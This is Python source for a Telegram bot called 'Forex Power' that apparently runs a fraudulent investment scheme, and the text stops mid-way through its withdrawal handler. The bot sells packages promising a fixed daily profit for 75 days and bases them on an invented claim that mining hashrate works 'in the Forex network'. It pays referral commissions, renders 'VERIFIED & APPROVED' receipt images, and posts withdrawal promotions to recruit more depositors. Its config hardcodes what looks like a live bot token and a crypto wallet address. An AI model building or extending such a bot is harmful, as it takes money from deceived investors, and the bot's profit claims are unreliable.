import telebot
from telebot import types
import json
import os
import time
import threading
from datetime import datetime
from io import BytesIO
from PIL import Image, ImageDraw, ImageFont

# ==========================================
# CONFIGURATION SECTION
# ==========================================
TOKEN = "8751264368:AAFZlkwBJvdJyWyPHibBSQTklsn3FFhgmoE"
ADMIN_ID = 1927800325
CHANNEL = "@FOREX_POWER_VIP"
CHANNEL2 = "@FOREX_POWER_TRADER"
BOT_USERNAME = "forex_power_bot"
USDT_ADDRESS = "TYqWp8rbjs8GJ6JcRnHknnQyo8thnmQvjp"

REFERRAL_COMMISSION_PERCENT = 0.06
MIN_WITHDRAW = 15
MIN_WITHDRAW_AFN = 200

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
DATA_FILE = "data.json"

# ==========================================
# LANGUAGE DICTIONARY (FULL)
# ==========================================
LANGS = {
    'fa': {
        'start': f"""<b>🚀 ربات سرمایه گذاری فارکس

👥 کاربران: {{total_users}}

📦 سیستم پکیج فعال

💵 سود روزانه به مدت 75 روز

⚡ شبکه TRC20</b>""",
        'menu_invest': '💰 سرمایه گذاری',
        'menu_withdraw': '📤 برداشت',
        'menu_account': '👤 حساب کاربری',
        'menu_referral': '👥 زیرمجموعه',
        'menu_support': '📞 پشتیبانی',
        'menu_about': 'ℹ️ درباره ربات',
        'menu_language': '🌐 Language / زبان',
        'menu_back': '🔙 بازگشت',
        'menu_stats': '📊 آمار ادمین',
        'menu_users': '👥 لیست کاربران',
        'menu_broadcast': '📢 پیام همگانی',
        'menu_set_rate': '💱 تنظیم نرخ دلار',
        
        'msg_about': """<b>ℹ️ درباره ربات فارکس پاور

ربات فارکس پاور یک پلتفرم هوشمند سرمایه‌گذاری در بازار ارزهای دیجیتال و فارکس است.

📌 <b>ویژگی‌ها:</b>
✅ سرمایه‌گذاری مطمئن با بازدهی بالا.
✅ پرداخت سود خودکار به صورت روزانه.
✅ سیستم زیرمجموعه‌گیری و کسب درآمد غیرفعال.
✅ پشتیبانی 24 ساعته.

📈 <b>نحوه عملکرد:</b>
شما با خرید یکی از پکیج‌های استخراج، هش‌ریت دریافت می‌کنید. این هش‌ریت به صورت 24 ساعته برای شما در شبکه فارکس کار می‌کند و سود روزانه خود را به مدت 75 روز دریافت می‌کنید.

⚠️ <b>ساعت کاری:</b>
پرداخت‌ها و پشتیبانی از ساعت 6 صبح تا 6 عصر می‌باشد.</b>""",
        
        'acc_info': """<b>👤 حساب کاربری

👤 نام: {first_name}

💰 سود (دلار): {profit}$ 
🇦🇫 معادل افغانی: {profit_afn} AFN
🔒 سرمایه گذاری شده: {invested}$ 
📦 پکیج: {package}

📈 سود روزانه: {daily_profit}$ 
⚡ نرخ هش: {hashrate}
👥 تعداد زیرمجموعه: {referral}

🔗 لینک دعوت:
https://t.me/{bot_username}?start={uid}</b>""",

        'ref_info': """<b>👥 سیستم زیرمجموعه

💎 کمیسیون: 6% 
👥 تعداد کل: {referral}

🔗 لینک شما:
https://t.me/{bot_username}?start={uid}</b>""",
        
        'join_first': '❗ لطفا ابتدا در کانال‌های زیر عضو شوید:',
        'join_btn': 'عضویت در کانال 1',
        'join_btn2': 'عضویت در کانال 2',
        'check_btn': '✅ بررسی عضویت',
        'welcome': '✅ خوش آمدید',
        
        'wd_select': '<b>💸 روش برداشت را انتخاب کنید:</b>',
        'wd_phone': '📱 لطفا شماره موبایل خود را وارد کنید:',
        'wd_addr': '✅ روش ذخیره شد.\n\n📍 لطفا شماره کارت / آدرس ولت خود را بفرستید:',
        'wd_amount': '✅ آدرس ذخیره شد.\n\n💰 حالا مبلغ برداشت را وارد کنید (حداقل {min}$):',
        'wd_amount_afn': '✅ شماره ذخیره شد.\n\n💰 حالا مبلغ برداشت را به <b>افغانی</b> وارد کنید (حداقل {min} AFN):',
        'wd_err_min': '❌ حداقل مبلغ برداشت 15 دلار است.',
        'wd_err_min_afn': '❌ حداقل مبلغ برداشت 200 افغانی است.',
        'wd_err_balance': '❌ موجودی سود کافی نیست.',
        'wd_sent': '✅ درخواست ارسال شد. منتظر تایید ادمین بمانید...',
        'wd_success': '<b>✅ برداشت تایید شد\n\nمبلغ: {amount} {currency}\nروش: {method}\n\nپول به حساب شما واریز شد.</b>',
        'wd_success_text': '<b>✅ برداشت تایید شد\n\nمبلغ: {amount} {currency}\nروش: {method}\n\n(رسید تصویری به دلیل خطای شبکه ارسال نشد، اما برداشت با موفقیت انجام شد).</b>',
        
        'inv_choose': '<b>🏦 ماینر خود را انتخاب کنید</b>\n\n',
        'inv_selected': """<b>✅ پکیج انتخاب شد

📦 پکیج: {level}

💰 سرمایه: {amount}$ 
📈 سود روزانه: {daily}$ 
⚡ هش‌ریت: {hashrate}
⚡ شبکه: TRC20

💳 آدرس ولت:
<code>{address}</code>

📤 لطفا اسکرین‌شات واریزی را ارسال کنید</b>""",
        'inv_approve': '<b>🎉 سرمایه گذاری تایید شد!\n\n📦 پکیج: {pkg}\n💰 مبلغ: ${amt}\n🚀 ماینر شما فعال شد.</b>',
        'inv_reject': '❌ سرمایه گذاری رد شد',
        
        'support_send': '📩 پیام خود را بنویسید',
        'support_done': '✅ ارسال شد',
        'reply_title': '📩 پاسخ ادمین\n\n',
        
        # Admin Rate
        'set_rate_msg': '💱 نرخ فعلی دلار: {rate}\n\nلطفا نرخ جدید را به عدد وارد کنید (مثلا 64):',
        'rate_updated': '✅ نرخ دلار به {rate} تغییر یافت.',
    },
    'en': {
        'start': f"""<b>🚀 FOREX INVESTMENT BOT

👥 USERS: {{total_users}}

📦 PACKAGE SYSTEM ACTIVE

💵 DAILY PROFIT FOR 75 DAYS

⚡ TRC20 NETWORK</b>""",
        'menu_invest': '💰 Invest',
        'menu_withdraw': '📤 Withdraw',
        'menu_account': '👤 Account',
        'menu_referral': '👥 Referral',
        'menu_support': '📞 Support',
        'menu_about': 'ℹ️ About Bot',
        'menu_language': '🌐 Language / زبان',
        'menu_back': '🔙 Back',
        'menu_stats': '📊 Admin Stats',
        'menu_users': '👥 Users List',
        'menu_broadcast': '📢 Broadcast',
        'menu_set_rate': '💱 Set USD Rate',
        
        'msg_about': """<b>ℹ️ About Forex Power Bot

Forex Power Bot is an intelligent investment platform in the Forex and Crypto market.

📌 <b>Features:</b>
✅ Secure investment with high returns.
✅ Automatic daily profit payouts.
✅ Referral system for passive income.
✅ 24/7 Support.

📈 <b>How it works:</b>
By purchasing a mining package, you receive hash rate. This hash rate works 24/7 in the Forex network for you, and you receive daily profit for 75 days.

⚠️ <b>Working Hours:</b>
Payments and support are available from 6 AM to 6 PM.</b>""",
        
        'acc_info': """<b>👤 ACCOUNT

👤 Name: {first_name}

💰 PROFIT (USD): {profit}$ 
🇦🇫 EQUIVALENT (AFN): {profit_afn} AFN
🔒 INVESTED: {invested}$ 
📦 PACKAGE: {package}

📈 DAILY PROFIT: {daily_profit}$ 
⚡ HASHRATE: {hashrate}
👥 REFERRALS: {referral}

🔗 REF LINK:
https://t.me/{bot_username}?start={uid}</b>""",

        'ref_info': """<b>👥 REFERRAL SYSTEM

💎 COMMISSION: 6% 
👥 TOTAL: {referral}

🔗 YOUR LINK:
https://t.me/{bot_username}?start={uid}</b>""",
        
        'join_first': '❗ Please join the channels below first:',
        'join_btn': 'JOIN CHANNEL 1',
        'join_btn2': 'JOIN CHANNEL 2',
        'check_btn': '✅ CHECK MEMBERSHIP',
        'welcome': '✅ Welcome',
        
        'wd_select': '<b>💸 Select Withdrawal Method:</b>',
        'wd_phone': '📱 Please enter your mobile number:',
        'wd_addr': '✅ Method saved.\n\n📍 Please send your <b>Wallet Address / ID</b>:',
        'wd_amount': '✅ Address saved.\n\n💰 Now enter the <b>Amount</b> you want to withdraw (Min {min}$):',
        'wd_amount_afn': '✅ Number saved.\n\n💰 Now enter the <b>Amount</b> in <b>Afghani</b> you want to withdraw (Min {min} AFN):',
        'wd_err_min': '❌ Minimum withdrawal is 15$',
        'wd_err_min_afn': '❌ Minimum withdrawal is 200 AFN',
        'wd_err_balance': '❌ Insufficient profit balance',
        'wd_sent': '✅ Request sent. Waiting for approval...',
        'wd_success': '<b>✅ Withdrawal Approved\n\nAmount: {amount} {currency}\nMethod: {method}\n\nFunds have been transferred.</b>',
        'wd_success_text': '<b>✅ Withdrawal Approved\n\nAmount: {amount} {currency}\nMethod: {method}\n\n(Image receipt failed due to timeout, but withdrawal completed).</b>',
        
        'inv_choose': '<b>🏦 CHOOSE YOUR MINER</b>\n\n',
        'inv_selected': """<b>✅ PACKAGE SELECTED

📦 PACKAGE: {level}

💰 INVEST: {amount}$ 
📈 DAILY: {daily}$ 
⚡ HASHRATE: {hashrate}
⚡ NETWORK: TRC20

💳 WALLET:
<code>{address}</code>

📤 Send payment screenshot now</b>""",
        'inv_approve': '<b>🎉 Investment Approved!\n\n📦 Package: {pkg}\n💰 Amount: ${amt}\n🚀 Your miner is now active.</b>',
        'inv_reject': '❌ Investment Rejected',
        
        'support_send': '📩 Send your message',
        'support_done': '✅ Sent',
        'reply_title': '📩 ADMIN REPLY\n\n',
        
        # Admin Rate
        'set_rate_msg': '💱 Current USD Rate: {rate}\n\nPlease enter new rate (e.g. 64):',
        'rate_updated': '✅ USD Rate updated to {rate}.',
    }
}

def get_text(user, key, **kwargs):
    lang = user.get('lang', 'fa')
    text = LANGS[lang].get(key, key)
    try:
        return text.format(**kwargs)
    except:
        return text

# ==========================================
# DATA MANAGEMENT SYSTEM
# ==========================================
def load():
    if not os.path.exists(DATA_FILE):
        with open(DATA_FILE, "w") as f:
            json.dump({}, f)

    try:
        with open(DATA_FILE) as f:
            data = json.load(f)
    except:
        data = {}

    settings = data.get("_SETTINGS", {})
    if "usd_to_afn" not in settings:
        settings["usd_to_afn"] = 65
        data["_SETTINGS"] = settings

    for uid in data:
        if uid == "_SETTINGS": continue
        u = data[uid]
        u.setdefault("balance", 0)
        u.setdefault("invested", 0)
        u.setdefault("profit", 0)
        u.setdefault("referral", 0)
        u.setdefault("daily_profit", 0)
        u.setdefault("package", "NONE")
        u.setdefault("last_profit", time.time())
        u.setdefault("step", None)
        u.setdefault("temp", 0)
        u.setdefault("wd_type", "")
        u.setdefault("wd_addr", "") 
        u.setdefault("wd_phone", "") 
        u.setdefault("ref_by", None)
        u.setdefault("first_name", "User")
        u.setdefault("username", "")
        u.setdefault("invest_time", 0)
        u.setdefault("hashrate", "0 GH/S")
        u.setdefault("lang", "fa")
        u.setdefault("temp_afn", 0)

    return data

def save(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

def get_exchange_rate(data):
    return data.get("_SETTINGS", {}).get("usd_to_afn", 65)

# ==========================================
# IMAGE GENERATORS (OPTIMIZED)
# ==========================================
def generate_receipt_image(user, amount, package_name, daily_profit):
    bg_path = "assets/deposit_bg.png"
    logo_path = "assets/logo.png"

    if os.path.exists(bg_path):
        img = Image.open(bg_path).convert("RGBA")
        # OPTIMIZATION: Resize if too large to prevent timeout
        if img.width > 1200 or img.height > 1700:
            img.thumbnail((1200, 1700), Image.Resampling.LANCZOS)
    else:
        img = Image.new('RGB', (1200, 1700), color='#000000')
    
    w, h = img.size
    d = ImageDraw.Draw(img)

    try:
        font_title = ImageFont.truetype("arialbd.ttf", 60)
        font_header = ImageFont.truetype("arialbd.ttf", 40)
        font_text = ImageFont.truetype("arial.ttf", 35)
        font_small = ImageFont.truetype("arial.ttf", 28)
    except IOError:
        font_title = ImageFont.load_default()
        font_header = ImageFont.load_default()
        font_text = ImageFont.load_default()
        font_small = ImageFont.load_default()

    if os.path.exists(logo_path):
        try:
            logo = Image.open(logo_path).convert("RGBA")
            logo = logo.resize((250, 250), Image.Resampling.LANCZOS)
            img.paste(logo, ((w - 250) // 2, 60), logo)
        except:
            pass

    text_color = '#FFFFFF'; gold_color = '#FFD700'; gray_color = '#AAAAAA' 

    d.text((w//2, 380), "PAYMENT RECEIPT", fill=gold_color, font=font_title, anchor="mm")
    d.text((w//2, 440), "VERIFIED & APPROVED", fill="#00FF7F", font=font_header, anchor="mm")

    info_y = 600
    d.text((100, info_y), "CLIENT DETAILS", fill=gold_color, font=font_small)
    d.text((100, info_y + 45), f"Name: {user.get('first_name', 'Unknown')}", fill=text_color, font=font_text)
    d.text((100, info_y + 90), f"Username: @{user.get('username', 'N/A')}", fill=gray_color, font=font_text)
    d.text((100, info_y + 135), f"Date: {datetime.now().strftime('%Y/%m/%d - %H:%M')}", fill=gray_color, font=font_text)

    det_y = 900
    d.text((100, det_y), "TRANSACTION DETAILS", fill=gold_color, font=font_small)
    d.text((100, det_y + 45), f"Package Plan:", fill=gray_color, font=font_text)
    d.text((350, det_y + 45), f"{package_name}", fill=text_color, font=font_header)
    d.text((100, det_y + 100), f"Invested Amount:", fill=gray_color, font=font_text)
    d.text((400, det_y + 100), f"${amount}", fill=gold_color, font=font_title)
    d.text((100, det_y + 155), f"Daily Profit:", fill=gray_color, font=font_text)
    d.text((350, det_y + 155), f"${daily_profit} / Day", fill="#00FF7F", font=font_header)

    d.text((w//2, h - 50), "www.forexpowerbot.com | Official Receipt", fill='#555555', font=font_small, anchor="mm")

    bio = BytesIO()
    bio.name = "luxury_receipt.png"
    img.save(bio, "PNG", quality=95) # Slightly reduced quality for speed
    bio.seek(0)
    return bio

def generate_withdrawal_receipt(user, amount, method, currency="USD", admin_photo_bytes=None):
    bg_path = "assets/withdraw_bg.png"
    logo_path = "assets/logo.png"

    if os.path.exists(bg_path):
        img = Image.open(bg_path).convert("RGBA")
        # OPTIMIZATION: Force resize to prevent timeout on large files
        if img.width > 1200 or img.height > 1700:
            img.thumbnail((1200, 1700), Image.Resampling.LANCZOS)
    else:
        img = Image.new('RGB', (1200, 1700), color='#050505')

    w, h = img.size
    d = ImageDraw.Draw(img)

    try:
        font_title = ImageFont.truetype("arialbd.ttf", 60)
        font_header = ImageFont.truetype("arialbd.ttf", 40)
        font_text = ImageFont.truetype("arial.ttf", 35)
        font_small = ImageFont.truetype("arial.ttf", 28)
    except IOError:
        font_title = ImageFont.load_default()
        font_header = ImageFont.load_default()
        font_text = ImageFont.load_default()
        font_small = ImageFont.load_default()

    if os.path.exists(logo_path):
        try:
            logo = Image.open(logo_path).convert("RGBA")
            logo = logo.resize((250, 250), Image.Resampling.LANCZOS)
            img.paste(logo, ((w - 250) // 2, 60), logo)
        except:
            pass

    d.text((w//2, 380), "WITHDRAWAL RECEIPT", fill='#FFD700', font=font_title, anchor="mm")
    d.text((w//2, 440), "PAYMENT SENT SUCCESSFULLY", fill='#FF3333', font=font_header, anchor="mm")

    current_text_y = 600
    if admin_photo_bytes:
        try:
            proof_img = Image.open(admin_photo_bytes).convert("RGB")
            max_w = 1000; max_h = 600
            proof_img.thumbnail((max_w, max_h)) # Already optimizes
            
            x_pos = (w - proof_img.width) // 2
            y_pos = 500
            
            img.paste(proof_img, (x_pos, y_pos))
            d.text((w//2, y_pos + proof_img.height + 20), "PROOF OF TRANSFER", fill='#AAAAAA', font=font_small, anchor="mm")
            
            current_text_y = y_pos + proof_img.height + 80
        except Exception as e:
            print(f"Error pasting admin photo: {e}")

    d.text((100, current_text_y), "CLIENT INFORMATION", fill='#FFD700', font=font_small)
    d.text((100, current_text_y + 45), f"Name: {user.get('first_name', 'Unknown')}", fill='#FFFFFF', font=font_text)
    
    phone = user.get('wd_phone', None)
    if phone:
        d.text((100, current_text_y + 90), f"Mobile: {phone}", fill='#FFFFFF', font=font_text)
        d.text((100, current_text_y + 135), f"Date: {datetime.now().strftime('%Y/%m/%d')}", fill='#AAAAAA', font=font_text)
        next_y_start = current_text_y + 200
    else:
        d.text((100, current_text_y + 90), f"Date: {datetime.now().strftime('%Y/%m/%d')}", fill='#AAAAAA', font=font_text)
        next_y_start = current_text_y + 150

    d.text((100, next_y_start), "TRANSACTION DETAILS", fill='#FFD700', font=font_small)
    d.text((100, next_y_start + 45), "Method:", fill='#AAAAAA', font=font_text)
    d.text((300, next_y_start + 45), f"{method}", fill='#FFFFFF', font=font_header)
    
    amount_str = f"{amount} {currency}" if currency != "USD" else f"${amount}"
    d.text((100, next_y_start + 100), "Amount Sent:", fill='#AAAAAA', font=font_text)
    d.text((450, next_y_start + 100), amount_str, fill='#FF3333', font=font_title) 
    d.text((100, next_y_start + 155), "Status:", fill='#AAAAAA', font=font_text)
    d.text((350, next_y_start + 155), "COMPLETED", fill='#FFD700', font=font_header)

    d.text((w//2, h - 50), "www.forexpowerbot.com | Official Withdrawal", fill='#555555', font=font_small, anchor="mm")

    bio = BytesIO()
    bio.name = "luxury_withdrawal.png"
    img.save(bio, "PNG", quality=95) # Reduced quality slightly for speed
    bio.seek(0)
    return bio

# ==========================================
# PACKAGES
# ==========================================
PACKAGES = {
    50: ("LV1", 1.5, "10 GH/S"),
    100: ("LV2", 3, "20 GH/S"),
    150: ("LV3", 4.5, "30 GH/S"),
    200: ("LV4", 6, "40 GH/S"),
    250: ("LV5", 7.5, "50 GH/S"),
    300: ("LV6", 9, "60 GH/S"),
    350: ("LV7", 10.5, "70 GH/S"),
    400: ("LV8", 12, "80 GH/S")
}

# ==========================================
# SYSTEM LOGIC
# ==========================================
def check_join(user_id):
    try:
        m1 = bot.get_chat_member(CHANNEL, user_id)
        m2 = bot.get_chat_member(CHANNEL2, user_id)
        s1 = m1.status in ["member", "administrator", "creator"]
        s2 = m2.status in ["member", "administrator", "creator"]
        return s1 and s2
    except:
        return False

def join_msg(user):
    kb = types.InlineKeyboardMarkup()
    kb.row(
        types.InlineKeyboardButton(get_text(user, 'join_btn'), url=f"https://t.me/{CHANNEL.replace('@','')}"),
        types.InlineKeyboardButton(get_text(user, 'join_btn2'), url=f"https://t.me/{CHANNEL2.replace('@','')}")
    )
    kb.add(types.InlineKeyboardButton(get_text(user, 'check_btn'), callback_data="check"))
    return kb

def main_menu(user):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    invest_text = get_text(user, 'menu_invest')
    withdraw_text = get_text(user, 'menu_withdraw')
    account_text = get_text(user, 'menu_account')
    referral_text = get_text(user, 'menu_referral')
    support_text = get_text(user, 'menu_support')
    about_text = get_text(user, 'menu_about')
    lang_text = get_text(user, 'menu_language')

    kb.row(invest_text, withdraw_text)
    kb.row(account_text, referral_text)
    kb.row(support_text, about_text)
    kb.row(lang_text)

    if user.get('id') == ADMIN_ID: 
        kb.row(get_text(user, 'menu_stats'), get_text(user, 'menu_users'))
        kb.row(get_text(user, 'menu_broadcast'), get_text(user, 'menu_set_rate'))

    return kb

def back_menu(user):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row(get_text(user, 'menu_back'))
    return kb

def auto_profit(user):
    now = time.time()
    if user.get("invest_time", 0) > 0:
        expiry_time = user["invest_time"] + (75 * 86400)
        last = user.get("last_profit", user["invest_time"])
        days_passed = int((now - last) / 86400)
        
        if days_passed >= 1:
            for _ in range(days_passed):
                if last < expiry_time:
                    user["profit"] += user.get("daily_profit", 0)
                    last += 86400
                else:
                    last = now
                    break
            user["last_profit"] = last

def night_message():
    while True:
        now = datetime.now()
        if now.hour == 18 and now.minute == 0:
            users = load()
            for uid in users:
                if uid == "_SETTINGS": continue
                try:
                    u = users[uid]
                    lang = u.get('lang', 'fa')
                    msg = "🌙 Good Evening\n\n⛔ Bot Offline" if lang == 'en' else "🌙 شب بخیر\n\n⛔ ربات آفلاین است"
                    bot.send_message(uid, msg)
                except: pass
            time.sleep(60)
        time.sleep(20)

# ==========================================
# HANDLERS
# ==========================================
@bot.message_handler(commands=['start'])
def start(m):
    users = load()
    uid = str(m.from_user.id)
    user_data = users.get(uid, {})

    if not check_join(m.from_user.id):
        temp_user = {'lang': user_data.get('lang', 'fa'), 'id': int(uid)}
        bot.send_message(m.chat.id, get_text(temp_user, 'join_first'), reply_markup=join_msg(temp_user))
        return

    if uid not in users:
        users[uid] = {
            "balance": 0, "invested": 0, "profit": 0, "referral": 0,
            "daily_profit": 0, "package": "NONE", "last_profit": time.time(),
            "step": None, "temp": 0, "wd_type": "", "wd_addr": "", "wd_phone": "",
            "ref_by": None, "first_name": m.from_user.first_name,
            "username": m.from_user.username if m.from_user.username else "NoUser",
            "invest_time": 0, "hashrate": "0 GH/S", "lang": "fa", "temp_afn": 0
        }
        user_data = users[uid]

        args = m.text.split()
        if len(args) > 1:
            ref_id = args[1]
            if ref_id != uid and ref_id in users:
                users[uid]["ref_by"] = ref_id
                users[ref_id]["referral"] += 1
                try: 
                    bot.send_message(ref_id, f"🎉 New referral joined: {users[uid]['first_name']}")
                except: pass

    total_users = len(users) - 1
    user_data['id'] = int(uid)
    bot.send_message(m.chat.id, get_text(user_data, 'start', total_users=total_users), reply_markup=main_menu(user_data))
    save(users)

@bot.message_handler(content_types=['text', 'photo'])
def handle(m):
    users = load()
    uid = str(m.from_user.id)

    if uid not in users: return

    user = users[uid]
    user['id'] = int(uid)
    rate = get_exchange_rate(users)

    t_invest = get_text(user, 'menu_invest')
    t_withdraw = get_text(user, 'menu_withdraw')
    t_account = get_text(user, 'menu_account')
    t_referral = get_text(user, 'menu_referral')
    t_support = get_text(user, 'menu_support')
    t_about = get_text(user, 'menu_about')
    t_lang = get_text(user, 'menu_language')
    t_back = get_text(user, 'menu_back')
    t_stats = get_text(user, 'menu_stats')
    t_users = get_text(user, 'menu_users')
    t_broadcast = get_text(user, 'menu_broadcast')
    t_set_rate = get_text(user, 'menu_set_rate')

    if not check_join(m.from_user.id):
        bot.send_message(m.chat.id, get_text(user, 'join_first'), reply_markup=join_msg(user))
        return

    auto_profit(user)
    save(users)
    text = m.text or ""

    # ================= ADMIN STATS =================
    if text == t_stats and int(uid) == ADMIN_ID:
        total_users_count = len(users) - 1
        total_invested = sum(u.get('invested', 0) for u in users.values() if u != "_SETTINGS")
        total_daily_payout = sum(u.get('daily_profit', 0) for u in users.values() if u != "_SETTINGS")
        stats_msg = f"""<b>📊 ADMIN DASHBOARD
👥 Total Users: {total_users_count}
💰 Total Invested: ${total_invested}
💸 Daily Payout: ${total_daily_payout}
💱 Rate: {rate} AFN</b>"""
        bot.send_message(m.chat.id, stats_msg, reply_markup=main_menu(user))
        return

    # ================= ADMIN SET RATE =================
    if text == t_set_rate and int(uid) == ADMIN_ID:
        user["step"] = "set_rate"
        save(users)
        bot.send_message(m.chat.id, get_text(user, 'set_rate_msg', rate=rate), reply_markup=back_menu(user))
        return
    if user["step"] == "set_rate" and int(uid) == ADMIN_ID:
        try:
            new_rate = float(text)
            if new_rate > 0:
                users["_SETTINGS"]["usd_to_afn"] = new_rate
                user["step"] = None
                save(users)
                bot.send_message(m.chat.id, get_text(user, 'rate_updated', rate=new_rate), reply_markup=main_menu(user))
        except: pass
        return

    # ================= ADMIN WITHDRAWAL RECEIPT HANDLER (OPTIMIZED) =================
    if int(uid) == ADMIN_ID and user["step"] and user["step"].startswith("receipt_"):
        target_uid = user["step"].split("_")[1]
        if m.photo:
            target_user = users[target_uid]
            amount = target_user['temp']
            method = target_user['wd_type']
            
            currency = "USD"
            display_amount = amount
            if "AFN" in method or "Afghani" in method:
                currency = "AFN"
                display_amount = target_user.get('temp_afn', amount * rate)

            target_user['profit'] -= amount
            
            try:
                # DOWNLOAD ADMIN PHOTO
                file_info = bot.get_file(m.photo[-1].file_id)
                admin_photo = BytesIO(bot.download_file(file_info.file_path))
                
                # GENERATE RECEIPT
                withdrawal_img = generate_withdrawal_receipt(target_user, display_amount, method, currency, admin_photo)
                
                # SEND TO USER
                bot.send_photo(target_uid, withdrawal_img, caption=get_text(target_user, 'wd_success', amount=display_amount, currency=currency, method=method))
                
                # SEND TO CHANNEL
                withdrawal_img.seek(0)
                try:
                    bot.send_photo(CHANNEL, withdrawal_img, caption=f"""<b>💸 SUCCESSFUL WITHDRAWAL 💸
👤 User: {target_user['first_name']}
💰 Amount: {display_amount} {currency}
🏦 Method: {method}
Join now: @{BOT_USERNAME}</b>""")
                except Exception as e: 
                    bot.send_message(ADMIN_ID, f"⚠️ Channel Error: {e}")
                
                bot.send_message(ADMIN_ID, f"✅ Withdrawal receipt sent to {target_user['first_name']}.")
            
            except Exception as e:
                # FALLBACK: If image generation fails (Timeout), send text
                print(f"Image generation error: {e}")
                bot.send_message(target_uid, get_text(target_user, 'wd_success_text', amount=display_amount, currency=currency, method=method))
                bot.send_message(ADMIN_ID, f"⚠️ Image failed (Timeout). Sent text receipt instead.")

            user["step"] = None
            save(users)
        else: 
            bot.send_message(ADMIN_ID, "❌ Please send a photo.")
        return

    # ================= ADMIN REPLY =================
    if int(uid) == ADMIN_ID and str(user["step"]).startswith("reply_"):
        target = user["step"].split("_")[1]
        try:
            bot.send_message(target, get_text(users[target], 'reply_title') + f"{m.text}</b>")
            bot.send_message(m.chat.id, get_text(user, 'support_done'))
        except: pass
        user["step"] = None
        save(users)
        return

    # ================= MENU BUTTONS =================
    if text == t_back:
        user["step"] = None; save(users)
        bot.send_message(m.chat.id, get_text(user, 'menu_back'), reply_markup=main_menu(user)); return

    if text == t_account:
        profit_afn = int(user['profit'] * rate)
        bot.send_message(m.chat.id, get_text(user, 'acc_info', first_name=user['first_name'], profit=round(user['profit'],2), profit_afn=profit_afn, invested=user['invested'], package=user['package'], daily_profit=user['daily_profit'], hashrate=user.get('hashrate', '0 GH/S'), referral=user['referral'], bot_username=BOT_USERNAME, uid=uid), reply_markup=main_menu(user)); return

    if text == t_referral:
        bot.send_message(m.chat.id, get_text(user, 'ref_info', referral=user['referral'], bot_username=BOT_USERNAME, uid=uid), reply_markup=main_menu(user)); return
    if text == t_about:
        bot.send_message(m.chat.id, get_text(user, 'msg_about'), reply_markup=main_menu(user)); return
    if text == t_lang:
        new_lang = 'en' if user['lang'] == 'fa' else 'fa'
        user['lang'] = new_lang; save(users)
        bot.send_message(m.chat.id, f"✅ Language changed to {new_lang.upper()}", reply_markup=main_menu(user)); return

    if text == t_support:
        user["step"] = "support"; save(users)
        bot.send_message(m.chat.id, get_text(user, 'support_send'), reply_markup=back_menu(user)); return
    if user["step"] == "support":
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("Reply", callback_data=f"reply_{uid}"))
        bot.send_message(ADMIN_ID, f"📞 SUPPORT MESSAGE\n\nUSER: {user['first_name']} ({uid})\nMESSAGE:\n{text}", reply_markup=kb)
        user["step"] = None; save(users)
        bot.send_message(m.chat.id, get_text(user, 'support_done'), reply_markup=main_menu(user)); return

    if text == t_broadcast and int(uid) == ADMIN_ID:
        user["step"] = "broadcast"; save(users)
        bot.send_message(m.chat.id, get_text(user, 'menu_broadcast'), reply_markup=back_menu(user)); return
    if user["step"] == "broadcast" and int(uid) == ADMIN_ID:
        count = 0
        for user_id in users:
            if user_id == "_SETTINGS": continue
            try: bot.send_message(user_id, text); count += 1
            except: pass
        user["step"] = None; save(users)
        bot.send_message(m.chat.id, f"✅ Broadcast sent to {count} users", reply_markup=main_menu(user)); return

    # ================= INVESTMENT LOGIC =================
    if text == t_invest:
        user["step"] = "invest"; save(users)
        msg_text = get_text(user, 'inv_choose')
        kb = types.InlineKeyboardMarkup(row_width=2)
        buttons_list = []
        for amount, (level, daily, hashrate) in sorted(PACKAGES.items()):
            msg_text += f"📦 <b>{level}</b>\n💰 {amount}$ | 📈 {daily}$/Day | ⚡ {hashrate}\n\n"
            buttons_list.append(types.InlineKeyboardButton(f"BUY {level}", callback_data=f"pkg_{amount}"))
        kb.add(*buttons_list)
        kb.row(types.InlineKeyboardButton(t_back, callback_data="back_to_main"))
        bot.send_message(m.chat.id, msg_text, reply_markup=kb); return

    if user["step"] == "photo" and m.photo:
        file_id = m.photo[-1].file_id
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("✅ Approve", callback_data=f"ok_{uid}"), types.InlineKeyboardButton("❌ Reject", callback_data=f"no_{uid}"))
        temp_amount = user['temp']
        pkg_details = PACKAGES.get(temp_amount, ("Unknown", 0, "0 GH/S"))
        bot.send_photo(ADMIN_ID, file_id, caption=f"""<b>📥 INVESTMENT REQUEST
👤 Name: {user['first_name']}
🆔 ID: {uid}
📦 Package: {pkg_details[0]}
💰 Amount: ${temp_amount}$ 
📈 Daily: ${pkg_details[1]}$</b>""", reply_markup=kb)
        user["step"] = None; save(users)
        bot.send_message(m.chat.id, "⏳ Waiting for approval", reply_markup=main_menu(user)); return

    # ================= WITHDRAWAL LOGIC =================
    if text == t_withdraw:
        kb = types.InlineKeyboardMarkup(row_width=1)
        kb.add(
            types.InlineKeyboardButton("💎 USDT TRC20", callback_data="wd_method_USDT TRC20"),
            types.InlineKeyboardButton("🟡 Binance ID", callback_data="wd_method_Binance ID"),
            types.InlineKeyboardButton("⚪ Perfect Money", callback_data="wd_method_Perfect Money"),
            types.InlineKeyboardButton("💳 Credit Card (AFN)", callback_data="wd_method_Credit Card (AFN)")
        )
        bot.send_message(m.chat.id, get_text(user, 'wd_select'), reply_markup=kb); return

    if user["step"] == "wd_phone":
        user["wd_phone"] = text
        user["step"] = "wd_amount_afn"
        save(users)
        bot.send_message(m.chat.id, get_text(user, 'wd_amount_afn', min=MIN_WITHDRAW_AFN), reply_markup=back_menu(user)); return

    if user["step"] == "wd_address":
        user["wd_addr"] = text
        if "AFN" in user["wd_type"]:
            user["step"] = "wd_amount_afn"
            save(users)
            bot.send_message(m.chat.id, get_text(user, 'wd_amount_afn', min=MIN_WITHDRAW_AFN), reply_markup=back_menu(user))
        else:
            user["step"] = "wd_amount"
            save(users)
            bot.send_message(m.chat.id, get_text(user, 'wd_amount', min=MIN_WITHDRAW), reply_markup=back_menu(user)); return

    if user["step"] == "wd_amount_afn":
        try: amount_afn = float(text)
        except: bot.send_message(m.chat.id, "❌ Invalid number."); return
        if amount_afn < MIN_WITHDRAW_AFN: bot.send_message(m.chat.id, get_text(user, 'wd_err_min_afn')); return
